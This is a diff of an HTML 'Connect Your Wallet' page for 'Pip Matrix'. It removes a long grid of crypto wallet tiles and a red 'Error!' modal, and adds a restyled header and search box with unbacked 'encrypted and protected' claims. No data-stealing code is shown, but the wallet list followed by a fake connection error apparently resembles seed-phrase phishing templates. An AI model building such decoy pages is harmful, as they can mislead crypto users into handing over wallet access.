-                            <div id="infinito" class="sc-author-box select_wallet" data-title="Infinito"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Infinito</a><span class="online-dot"></span></h5>
-                                    <span class="price">infinitowallet.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="wallet_io" class="sc-author-box select_wallet" data-title="Wallet.io"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Wallet.io</a><span class="online-dot"></span></h5>
-                                    <span class="price">wallet.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="ownbit" class="sc-author-box select_wallet" data-title="Ownbit"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Ownbit</a><span class="online-dot"></span></h5>
-                                    <span class="price">ownbit.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="easypocket" class="sc-author-box select_wallet" data-title="EasyPocket"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>EasyPocket</a><span class="online-dot"></span></h5>
-                                    <span class="price">easypocket.app</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="bridget_wallet" class="sc-author-box select_wallet" data-title="Bridge Wallet"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Bridge Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">mtpelerin.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="via_wallet" class="sc-author-box select_wallet" data-title="ViaWallet"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>ViaWallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">viawallet.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="bitkeep" class="sc-author-box select_wallet" data-title="BitKeep"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>BitKeep</a><span class="online-dot"></span></h5>
-                                    <span class="price">bitkeep.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="unstoppable_wallet" class="sc-author-box select_wallet"
-                                data-title="Unstoppable Wallet" data-logo="https://www.svgrepo.com/show/373426/wallet.svg"
-                                style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Unstoppable Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">unstoppable.money</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="halodefi_wallet" class="sc-author-box select_wallet" data-title="HaloDefi Wallet"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>HaloDefi Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">halodefi.org</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="dok_wallet" class="sc-author-box select_wallet" data-title="Yoroi Wallet"
-                                data-logo="https://play-lh.googleusercontent.com/UlhGKCVtUuXjDDF_fFdDQaF7mdUpMpsKvfQNNQHuwzbNEvvN-sYRNLk308wpWmLQkR4"
-                                style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://play-lh.googleusercontent.com/UlhGKCVtUuXjDDF_fFdDQaF7mdUpMpsKvfQNNQHuwzbNEvvN-sYRNLk308wpWmLQkR4"
-                                            alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Yoroi Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">Yoroi.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="dok_wallet" class="sc-author-box select_wallet" data-title="Dok Wallet"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Dok Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">dokwallet.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="celo_wallet" class="sc-author-box select_wallet" data-title="Cello Wallet"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Cello Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">cellowallet.app</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="coinus" class="sc-author-box select_wallet" data-title="CoinUs"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>CoinUs</a><span class="online-dot"></span></h5>
-                                    <span class="price">coinus.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="valora" class="sc-author-box select_wallet" data-title="Valora"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Valora</a><span class="online-dot"></span></h5>
-                                    <span class="price">valoraapp.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="trustee_wallet" class="sc-author-box select_wallet" data-title="Trustee Wallet"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Trustee Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">trusteeglobal.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="guarda_wallet" class="sc-author-box select_wallet" data-title="Gaurda Wallet"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Gaurda Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">guarda.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="jade_wallet" class="sc-author-box select_wallet" data-title="Jade Wallet"
-                                data-logo="https://jade.blockstream.com/img/icon.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://jade.blockstream.com/img/icon.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Jade Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">jadewallet.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="plasmapay" class="sc-author-box select_wallet" data-title="PlasmaPay"
-                                data-logo="https://plasmapay.com/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://plasmapay.com/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>PlasmaPay</a><span class="online-dot"></span></h5>
-                                    <span class="price">plasmapay.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="o3_wallet" class="sc-author-box select_wallet" data-title="O3Wallet"
-                                data-logo="https://o3.network/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://o3.network/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>O3Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">o3.network</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="hashkey_me" class="sc-author-box select_wallet" data-title="HashKey Me"
-                                data-logo="https://me.hashkey.com/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://me.hashkey.com/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>HashKey Me</a><span class="online-dot"></span></h5>
-                                    <span class="price">me.hashkey.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="rwallet" class="sc-author-box select_wallet" data-title="RWallet"
-                                data-logo="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/rsk/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/rsk/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>RWallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">rsk.co</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="flare_wallet" class="sc-author-box select_wallet" data-title="Flare Wallet"
-                                data-logo="https://flare.xyz/img/icon.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://flare.xyz/img/icon.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Flare Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">flarewallet.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="kyberswap" class="sc-author-box select_wallet" data-title="KyberSwap"
-                                data-logo="https://kyberswap.com/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://kyberswap.com/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>KyberSwap</a><span class="online-dot"></span></h5>
-                                    <span class="price">kyberswap.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="atoken_wallet" class="sc-author-box select_wallet" data-title="AToken Wallet"
-                                data-logo="https://atoken.com/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://atoken.com/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>AToken Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">atoken.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="tongue_wallet" class="sc-author-box select_wallet" data-title="Tongue Wallet"
-                                data-logo="https://tongue.fi/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://tongue.fi/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Tongue Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">tongue.fi</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="xinfin" class="sc-author-box select_wallet" data-title="XinFin XDC Network"
-                                data-logo="https://xinfin.io/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://xinfin.io/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>XinFin XDC Network</a><span class="online-dot"></span></h5>
-                                    <span class="price">xinfin.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="talken_wallet" class="sc-author-box select_wallet" data-title="Talken Wallet"
-                                data-logo="https://talken.io/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://talken.io/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Talken Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">talken.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="keyring_pro" class="sc-author-box select_wallet" data-title="KEYRING PRO"
-                                data-logo="https://keyring.app/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://keyring.app/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>KEYRING PRO</a><span class="online-dot"></span></h5>
-                                    <span class="price">keyring.app</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="midas_wallet" class="sc-author-box select_wallet" data-title="Midas Wallet"
-                                data-logo="https://midasprotocol.io/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://midasprotocol.io/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Midas Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">midasprotocol.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="at_wallet" class="sc-author-box select_wallet" data-title="AT.Wallet"
-                                data-logo="https://authentrend.com/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://authentrend.com/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>AT.Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">authentrend.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="imtoken" class="sc-author-box select_wallet" data-title="imToken"
-                                data-logo="https://www.imtoken.io/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.imtoken.io/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>imToken</a><span class="online-dot"></span></h5>
-                                    <span class="price">token.im</span>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        
-                        
-                        
-                        
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="imtoken" class="sc-author-box select_wallet" data-title="D'Cent"
-                                data-logo="https://dcentwallet.com/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>D'Cent</a><span class="online-dot"></span></h5>
-                                    <span class="price">dcentwallet.com</span>
-                                </div>
-                            </div>
-                        </div>
-                     
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Enjin"
-                                data-logo="https://enjin.io/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://enjin.io/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Enjin</a><span class="online-dot"></span></h5>
-                                    <span class="price">enjin.io</span>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Etoro"
-                                data-logo="https://etoro.com/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://etoro.com/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Etoro</a><span class="online-dot"></span></h5>
-                                    <span class="price">etoro.com</span>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="imtoken" class="sc-author-box select_wallet" data-title="ONTO"
-                                data-logo="https://onto.app/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://onto.app/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>ONTO</a><span class="online-dot"></span></h5>
-                                    <span class="price">onto.app</span>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Spatium"
-                                data-logo="https://spatium.net/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://spatium.net/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Spatium</a><span class="online-dot"></span></h5>
-                                    <span class="price">spatium.net</span>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Torus"
-                                data-logo="https://tor.us/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://tor.us/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Tirus</a><span class="online-dot"></span></h5>
-                                    <span class="price">tor.us</span>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Tradestation"
-                                data-logo="https://www.tradestation.com/favicon.ico" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.tradestation.com/favicon.ico" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Tradestation</a><span class="online-dot"></span></h5>
-                                    <span class="price">tradestation.com</span>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Zelcore"
-                                data-logo="https://zelcore.io/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://zelcore.io/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Zelcore</a><span class="online-dot"></span></h5>
-                                    <span class="price">zelcore.io</span>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Bifrost"
-                                data-logo="https://bifrostwallet.com/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://bifrostwallet.com/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Bifrost Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">bifrostwallet.com</span>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Exodus"
-                                data-logo="https://exodus.com/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://exodus.com/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Exodus</a><span class="online-dot"></span></h5>
-                                    <span class="price">exodus.com</span>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Ellipal"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Ellipal</a><span class="online-dot"></span></h5>
-                                    <span class="price">ellipal.com</span>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Trezor"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Trezor</a><span class="online-dot"></span></h5>
-                                    <span class="price">trezor.io</span>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Arculus"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Arculus</a><span class="online-dot"></span></h5>
-                                    <span class="price">getarculus.com</span>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        
-                        
-                        
-                        
-                        
-                        
-                        
-                         <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 error" style="display: none">
-                            <div class="sc-author-box">
-                                <div class="author-avatar">
-                                    <a href="#0">
-                                        <img src="error.png" alt="Image" class="avatar">
-                                    </a>
-                                    
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>No match was found</a></h5>
-                                    <span class="price"></span>
-                                </div>
-                            </div>
-                        </div>
-                        
-                      
-
-                    </div>
-                </div>
-            </section>
-
+<body class="bg-gray-900 text-gray-100 min-h-screen font-sans">
+    <!-- Header -->
+    <header class="bg-gray-900/95 backdrop-blur-xl border-b border-gray-800 sticky top-0 z-40">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+                <a href="DASHBOARD.html" class="flex items-center gap-3">
+                    <img src="images/LOGO.jpeg" alt="Pip Matrix" class="h-8 w-8 rounded-lg">
+                    <span class="text-xl font-bold bg-gradient-to-r from-indigo-400 to-blue-400 bg-clip-text text-transparent">Pip Matrix</span>
+                </a>
+                <a href="DASHBOARD.html" class="inline-flex items-center gap-2 px-4 py-2 text-gray-400 hover:text-white transition-colors">
+                    <i data-lucide="arrow-left" class="w-4 h-4"></i>
+                    Back to Dashboard
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
+        <!-- Title Section -->
+        <div class="text-center mb-8 sm:mb-12">
+            <div class="inline-flex items-center gap-2 px-4 py-2 bg-indigo-500/10 border border-indigo-500/20 rounded-full mb-4">
+                <div class="w-2 h-2 bg-indigo-400 rounded-full animate-pulse"></div>
+                <span class="text-indigo-400 text-sm font-medium">Secure Connection</span>
+            </div>
+            <h1 class="text-3xl sm:text-4xl lg:text-5xl font-bold text-white mb-4">Connect Your Wallet</h1>
+            <p class="text-gray-400 text-base sm:text-lg max-w-2xl mx-auto">
+                Select your preferred wallet to connect securely. All connections are encrypted and protected.
+            </p>
         </div>
 
-        <div class="modal fade popup" id="popup_connect_wallet_success" tabindex="-1" role="dialog" aria-hidden="true">
-            <div class="modal-dialog modal-dialog-centered" role="document">
-                <div class="modal-content">
-                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                        <span aria-hidden="true">×</span>
-                    </button>
-                    <div class="modal-body space-y-20 pd-40">
+        <!-- Search Box -->
+        <div class="max-w-md mx-auto mb-8">
+            <div class="relative">
+                <i data-lucide="search" class="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500"></i>
+                <input 
+                    type="text" 
+                    x-model="searchQuery"
+                    placeholder="Search wallets..."
+                    class="w-full pl-12 pr-4 py-3 bg-gray-800 border border-gray-700 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-indigo-500 focus:ring-2 focus:ring-indigo-500/20 transition-all"
+                >
+            </div>
+        </div>
 
-
-                        <center>
-                            <h4 style="font-size: 90px;
-   
-   color: red;">Error!</h4>
-                        </center>
+        <!-- Wallets Grid -->
